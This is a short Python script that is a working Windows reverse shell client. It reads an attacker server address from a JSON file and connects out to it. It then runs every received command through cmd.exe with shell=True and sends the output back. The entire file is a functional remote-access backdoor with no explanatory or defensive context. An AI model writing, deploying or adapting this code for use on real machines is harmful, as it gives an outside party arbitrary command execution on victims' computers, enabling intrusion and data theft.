import socket, os, sys, pickle, json
import subprocess as sp
from time import sleep

def get_arguments():
    with open("PRMTR.json", "r+") as file:
        args = json.load(file)
        return args

if __name__ == ("__main__"):
    args = get_arguments()
    socket = socket.socket()
    socket.connect((args["server_ip"], args["server_port"]))
    while True:
        command = socket.recv(4096).decode(encoding="latin1")
        if command == ("exit"):
            socket.close()
            sys.exit()
        if len(command) > 2 and len(command[3:]) > 0:
            if os.path.exists(command[3:]) and os.path.isdir(command[3:]):
                os.chdir(command[3:])
        run = sp.run(["cmd.exe", "/C", command], capture_output=True, shell=True,
        text=True, universal_newlines=True).stdout
        output_length = len(run)
        socket.send(pickle.dumps(output_length))
        run = run.encode(encoding="latin1")
        socket.send(run)
